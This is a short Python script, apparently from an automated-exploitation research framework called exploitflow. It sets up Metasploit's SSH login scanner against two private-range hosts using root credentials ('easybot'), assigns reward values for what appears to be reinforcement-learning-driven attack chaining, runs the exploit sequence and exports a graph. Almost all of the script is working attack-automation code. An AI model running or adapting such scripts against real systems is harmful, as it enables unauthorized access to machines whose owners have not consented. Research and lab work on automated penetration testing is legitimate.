import math
import random
import sys
import exploitflow as ef
from wasabi import color
from exploitflow.state import State_v4
State_default = State_v4

flow = ef.Flow()

## new exploits, if needed
metasploit_2 = ef.adapter_msf_initializer.get_name("auxiliary", "scanner/ssh/ssh_login")
metasploit_2.name = "scanner/ssh/ssh_login @ 192.168.2.5"

## set options
# ef.targets.target = "192.168.2.1"
# ef.versions.target = "192.168.2.10"
msf_options = {
    "RHOSTS": "192.168.2.10",
    "USERNAME": "root",
    "PASSWORD": "easybot"
}        
ef.metasploit.set_options(msf_options)
ef.metasploit.target = "192.168.2.10"

msf_options = {
    "RHOSTS": "192.168.2.5",
    "USERNAME": "root",
    "PASSWORD": "easybot"
}
metasploit_2.set_options(msf_options)
metasploit_2.target = "192.168.2.5"

## set reward
ef.idle.reward = 0
ef.metasploit.reward = -100  # first time successful, will do "*(-1)" to get "+100"
metasploit_2.reward = -100   # first time successful, will do "*(-1)" to get "+100   
# ef.versions.reward = -10
# ef.targets.reward = -10

# state = flow.run(ef.init)
# state = flow.run(flow.state() * ef.metasploit)
# state = flow.run(flow.state() * ef.idle)
# state = flow.run(flow.state() * ef.idle)
# state = flow.run(flow.state() * ef.idle)
# state = flow.run(flow.state() * ef.idle)
# state = flow.run(flow.state() * ef.idle)
# state = flow.run(flow.state() * ef.idle)
# state = flow.run(flow.state() * ef.idle)
# state = flow.run(flow.state() * ef.idle)

state = flow.run(ef.init * ef.metasploit * 
                    ef.idle * ef.idle * ef.idle * ef.idle * 
                    ef.idle * ef.idle * ef.idle * ef.idle)
print(flow)

# # ASCII-depict graph
# print(flow.ascii())
flow.to_dot("/tmp/exploitflow.dot")
# flow.plot()